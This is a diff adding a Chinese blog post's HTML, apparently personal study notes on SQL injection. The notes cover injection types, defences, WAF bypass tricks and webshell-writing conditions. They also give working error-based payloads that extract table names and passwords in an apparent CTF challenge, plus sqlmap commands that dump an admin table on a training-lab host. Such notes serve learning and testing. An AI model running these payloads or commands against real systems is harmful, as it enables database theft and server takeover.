@@ -1,0 +1,924 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="概念原理：没有对用户输入的参数进行严格过滤处理，攻击者构造恶意sql语句，输入到数据库引擎执行，获取或修改数据库中的数据 从注入参数类型分：数字型注入、字符型注入 从注入效果分：报错注入、布尔注入、延时注入、联合注入、堆叠注入、宽字节注入 从提交方式分：GET注入、POST注入、HTTP头注入、COOKIE注入 若面试时问sql注入分类时，优先回答数字型注入和字符型注入，尽量别让面试官问太深">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Top10之sql注入">
+<meta property="og:url" content="https://flowers-boy.top/posts/14324.html">
+<meta property="og:site_name" content="关根">
+<meta property="og:description" content="概念原理：没有对用户输入的参数进行严格过滤处理，攻击者构造恶意sql语句，输入到数据库引擎执行，获取或修改数据库中的数据 从注入参数类型分：数字型注入、字符型注入 从注入效果分：报错注入、布尔注入、延时注入、联合注入、堆叠注入、宽字节注入 从提交方式分：GET注入、POST注入、HTTP头注入、COOKIE注入 若面试时问sql注入分类时，优先回答数字型注入和字符型注入，尽量别让面试官问太深">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629145045335-731800567.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629153437893-146078443.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629145511742-1801461174.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629150449570-379809354.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629150523907-1285885585.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629154034946-2005004803.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629154253769-103837740.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629144744274-588012684.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629162934903-2013218290.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629163240527-2132078266.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629163735706-1413651364.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629164137884-1742896494.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629155919733-1738578833.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629161017705-1750736841.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629102629341-2005610739.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629103115334-1978135182.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629225019362-1399824383.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629221345246-1700501146.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629222305486-124287074.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629222907331-1913924677.png">
+<meta property="og:image" content="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629222935182-1321671263.png">
+<meta property="article:published_time" content="2024-06-28T13:50:58.000Z">
+<meta property="article:modified_time" content="2024-06-29T14:56:53.098Z">
+<meta property="article:author" content="关根">
+<meta property="article:tag" content="关键词">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629145045335-731800567.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://flowers-boy.top/posts/14324.html"/>
+
+
+
+
+
+  <title>Top10之sql注入 | 关根</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">关根</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">爱具体的人 做具体的事</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-首页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于我">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://flowers-boy.top/posts/14324.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="关根">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Top10之sql注入</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2024-06-28T21:50:58+08:00">
+                2024-06-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
+                    <span itemprop="name">学习笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv">本文总阅读量
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <meta name="referrer" content="no-referrer">
+
+<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p><strong>原理：</strong>没有对用户输入的参数进行严格过滤处理，攻击者构造恶意sql语句，输入到数据库引擎执行，获取或修改数据库中的数据</p>
+<p><strong>从注入参数类型分：</strong>数字型注入、字符型注入</p>
+<p><strong>从注入效果分：</strong>报错注入、布尔注入、延时注入、联合注入、堆叠注入、宽字节注入</p>
+<p><strong>从提交方式分：</strong>GET注入、POST注入、HTTP头注入、COOKIE注入</p>
+<p>若面试时问sql注入分类时，优先回答数字型注入和字符型注入，尽量别让面试官问太深</p>
+<p><strong>报错注入用到的函数：</strong>updatexml、floor、extractvalue，exp</p>
+<p><strong>布尔盲注用到的函数：</strong>substr，mid，left，right，ascii，ord，char，length</p>
+<p><strong>时间盲注用到的函数：</strong>sleep</p>
+<p><strong>SQL注入防御</strong></p>
+<ul>
+<li>对关键函数或字符过滤：union select order by information_schema等</li>
+<li>下载相关防范注入文件，通过incloude函数包含在网站配置文件里面</li>
+<li>pdo预处理，使用预编译语句</li>
+<li>添加白名单来规范输入验证方法</li>
+<li>对客户端输入进行控制，限制特殊字符和函数的输入</li>
+</ul>
+<p><strong>SQL注入绕过waf</strong>：</p>
+<ul>
+<li>大小写双写</li>
+<li>使用编码：unioncode编码 十六进制编码 url编码</li>
+<li>等价函数：mid，substr（），substring（） &amp;&amp;和||&gt; and 和or &#x3D;号可以用&lt;&gt;因为如果不大于不小于就是等于</li>
+</ul>
+<p><strong>SQL注入写shell条件：</strong></p>
+<ul>
+<li>知道web服务器的绝对路径</li>
+<li>数据库具有root权限</li>
+<li>secure_file_priv函数 没有特殊的值</li>
+<li>PHP关闭魔术引号，php主动转义功能关闭</li>
+</ul>
+<p><strong>SQL写入shell的方式：</strong> </p>
+<ul>
+<li><p>通过本地写入into outfile函数 </p>
+</li>
+<li><p>通过日志写入需要对 general_log 和 general_log_file 变量进行更改 </p>
+</li>
+<li><p>通过sqlmap –os-shell命令写入</p>
+</li>
+</ul>
+<p><strong>二次注入：</strong>后端代码对用户输入的数据进行了转义，然后在保存到数据库的时候是没有进行转 义，然后再从数据库当中取出数据的时候，没有对数据库中的特殊字符进行转义和验证，就可能 形成闭合，导致注入</p>
+<p>防御：使用统一编码格式utf-8对用户输入的内容进行验证过滤</p>
+<h1 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h1><h3 id="联合注入函数"><a href="#联合注入函数" class="headerlink" title="联合注入函数"></a>联合注入函数</h3><h4 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h4><p>用来连接</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629145045335-731800567.png" alt="image-20240629145044710"></p>
+<h4 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat()"></a>group_concat()</h4><p>将内容以逗号显示隔开</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629153437893-146078443.png" alt="image-20240629153437211"></p>
+<h3 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h3><h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><p>当数据超过一行时就可以使用</p>
+<p>limit 0,1：从表中的第0个数据开始，只读取一个</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629145511742-1801461174.png" alt="image-20240629145511197"></p>
+<p>1’ or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)),0)#</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629150449570-379809354.png" alt="image-20240629150449096"></p>
+<p>1’ or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1)),0)#</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629150523907-1285885585.png" alt="image-20240629150523486"></p>
+<h4 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h4><p>返回小于等于该值的最大整数</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629154034946-2005004803.png" alt="image-20240629154034396"></p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h4><p>以e为底指数函数</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629154253769-103837740.png" alt="image-20240629154253205"></p>
+<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><p>updatexml(<code>xml_doument</code>,<code>XPath_string</code>,<code>new_value</code>)</p>
+<ul>
+<li>第一个参数是xml内容</li>
+<li>第二个参数是需要update的位置XPATH路径</li>
+<li>第三个参数是更新后的内容</li>
+</ul>
+<p>所以第一和第三个参数可以随便写，只需要利用第二个参数。他会校验你输入的内容是否符合XPATH格式</p>
+<p><code>0x7e</code>用来校验，它是<code>~</code>的十六进制</p>
+<p>‘<del>pikachu</del>‘</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629144744274-588012684.png" alt="image-20240629144743855"></p>
+<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>extractvalue(XML_document, XPath_string);</p>
+<ul>
+<li>第一个参数是xml内容</li>
+<li>第二个参数是需要update的位置XPATH路径</li>
+</ul>
+<h3 id="盲注函数"><a href="#盲注函数" class="headerlink" title="盲注函数"></a>盲注函数</h3><h4 id="length"><a href="#length" class="headerlink" title="length()"></a>length()</h4><p>返回指定对象长度</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629162934903-2013218290.png" alt="image-20240629162934571"></p>
+<h4 id="left-与right"><a href="#left-与right" class="headerlink" title="left()与right()"></a>left()与right()</h4><p>left(str,num)</p>
+<p>right(str,num)：</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629163240527-2132078266.png" alt="image-20240629163240143"></p>
+<h4 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h4><p>从第1位开始，截取3位；与mid用法相同</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629163735706-1413651364.png" alt="image-20240629163735415"></p>
+<h4 id="ascii"><a href="#ascii" class="headerlink" title="ascii()"></a>ascii()</h4><p>ord函数与ascii用法相同</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629164137884-1742896494.png" alt="image-20240629164137458"></p>
+<h4 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h4><p>sleep(5)	   过5s响应</p>
+<h3 id="读写文件函数"><a href="#读写文件函数" class="headerlink" title="读写文件函数"></a>读写文件函数</h3><h4 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h4><p>读取文件</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629155919733-1738578833.png" alt="image-20240629155918712"></p>
+<h4 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h4><p>into outfile 与 into dumpfile都是写文件</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629161017705-1750736841.png" alt="image-20240629161016569"></p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>^也可以绕过or的限制</p>
+<p><strong>条件：</strong>1’判断注入类型，需出现报错提示</p>
+<p><strong>注：</strong>是否为、单引号、双引号等注入需要自己尝试，有返回内容</p>
+<p>万能语句<code>1&#39; or 1=1#</code>被过滤情况可以使用burp suit进行字典查过滤字符</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629102629341-2005610739.png" alt="image-20240629102628543"></p>
+<p>看响应值789长度是被过滤的字符</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629103115334-1978135182.png" alt="image-20240629103114405"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br><span class="line"></span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#</span><br><span class="line"></span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e),1))#</span><br><span class="line"></span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#</span><br><span class="line"></span><br><span class="line">1&#x27;or(updatexml(1,concat(0x7e,(select(right(password,25))from(H4rDsq1)),0x7e),1))#</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;^extractvalue(1,concat(0x7e,(select(database()))))#</span><br><span class="line"></span><br><span class="line">1&#x27;or(extractvalue(1,concat(0x7e,(select(database())))))#</span><br><span class="line"></span><br><span class="line">1&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))))#</span><br><span class="line"></span><br><span class="line">1&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database()))))#</span><br><span class="line"></span><br><span class="line">1&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))))#</span><br><span class="line"></span><br><span class="line">1&#x27;^extractvalue(1,right(concat(0x7e,(select(right(password,25))from(H4rDsq1))),30))# </span><br></pre></td></tr></table></figure>
+
+<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629225019362-1399824383.png" alt="image-20240629225018414"></p>
+<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">-u url              指定url</span><br><span class="line">--data=DATA         该参数指定的数据会被作为POST数据提交</span><br><span class="line">-r file.txt         常用于POST注入或表单提交时注入</span><br><span class="line">--cookie            设置cookie</span><br><span class="line">--dump              拉取数据存放到本地</span><br><span class="line">--users             输出数据库系统的所有用户</span><br><span class="line">--dbs               输出数据库系统的所有数据库</span><br><span class="line">-D DB               指定数据库</span><br><span class="line">--tables            在-D情况下输出库中所有表名</span><br><span class="line">-T table            在-D情况下指定数据表</span><br><span class="line">-C column           在-D -T情况下输出某列数据的值</span><br><span class="line">--columns           在-D -T情况下输出表中所有列名</span><br><span class="line"></span><br><span class="line">--level             检测级别（1~5，默认1）</span><br><span class="line">lv2：cookie; lv3：user-agent，refere; lv5：host</span><br><span class="line"></span><br><span class="line">--risk              风险等级（1~4，默认1）</span><br><span class="line">risk 2：基于事件的测试;risk 3：or语句的测试;risk 4：update的测试</span><br><span class="line"></span><br><span class="line">--threads           指定线程并发数</span><br><span class="line">默认为1，最大10</span><br><span class="line"></span><br><span class="line">--os-cmd            执行任意系统命令</span><br><span class="line">--os-shell          使用交互式shell执行命令</span><br><span class="line">--batch             所有要求输入都选取默认值</span><br></pre></td></tr></table></figure>
+
+<p>数据库 –dbs</p>
+<p>表 -D 数据库名 –tables</p>
+<p>值 -D 数据库名 -T 表名 –columns</p>
+<p>字段 -C 字段</p>
+<h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>去掉id&#x3D;xxx后；看网页是否能正常打开</p>
+<p>正常打开说明ID的值决定了页面，存在cookie注入</p>
+<p>拆表</p>
+<p>sqlmap -u “<a target="_blank" rel="noopener" href="http://g8wepfcp.ia.aqlab.cn/shownews.asp">http://g8wepfcp.ia.aqlab.cn/shownews.asp</a>?” –cookie “id&#x3D;171” –tables   –level 2  –thread 10 –batch</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629221345246-1700501146.png" alt="image-20240629221344312"></p>
+<p>拆字段</p>
+<p>sqlmap -u “<a target="_blank" rel="noopener" href="http://g8wepfcp.ia.aqlab.cn/shownews.asp">http://g8wepfcp.ia.aqlab.cn/shownews.asp</a>?” –cookie “id&#x3D;171” -T admin –column –level 2  –thread 10 –batch</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629222305486-124287074.png" alt="image-20240629222304754"></p>
+<p>拆字段值</p>
+<p>sqlmap -u “<a target="_blank" rel="noopener" href="http://g8wepfcp.ia.aqlab.cn/shownews.asp">http://g8wepfcp.ia.aqlab.cn/shownews.asp</a>?” –cookie “id&#x3D;171” -T admin -C flag –level 2  –thread 10 –batch –dump</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629222907331-1913924677.png" alt="image-20240629222906385"></p>
+<p>解密md5</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240629222935182-1321671263.png" alt="image-20240629222934683"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/posts/2590.html" rel="next" title="信安管评一阶段">
+                <i class="fa fa-chevron-left"></i> 信安管评一阶段
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/lu-fe1" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:2186533588@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/2301_82000839?spm=1000.2115.3001.5343" target="_blank" title="CSDN">
+                      
+                        <i class="fa fa-fw fa-CSDN"></i>CSDN</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A6%82%E5%BF%B5"><span class="nav-number">1.</span> <span class="nav-text">概念</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0"><span class="nav-number">2.</span> <span class="nav-text">常见函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0"><span class="nav-number">2.0.1.</span> <span class="nav-text">联合注入函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#concat"><span class="nav-number">2.0.1.1.</span> <span class="nav-text">concat</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#group-concat"><span class="nav-number">2.0.1.2.</span> <span class="nav-text">group_concat()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0"><span class="nav-number">2.0.2.</span> <span class="nav-text">报错注入函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#limit"><span class="nav-number">2.0.2.1.</span> <span class="nav-text">limit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#floor"><span class="nav-number">2.0.2.2.</span> <span class="nav-text">floor()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp"><span class="nav-number">2.0.2.3.</span> <span class="nav-text">exp()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#updatexml"><span class="nav-number">2.0.2.4.</span> <span class="nav-text">updatexml</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#extractvalue"><span class="nav-number">2.0.2.5.</span> <span class="nav-text">extractvalue()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8%E5%87%BD%E6%95%B0"><span class="nav-number">2.0.3.</span> <span class="nav-text">盲注函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#length"><span class="nav-number">2.0.3.1.</span> <span class="nav-text">length()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#left-%E4%B8%8Eright"><span class="nav-number">2.0.3.2.</span> <span class="nav-text">left()与right()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#substr"><span class="nav-number">2.0.3.3.</span> <span class="nav-text">substr()</span></a></li><li class="nav-item 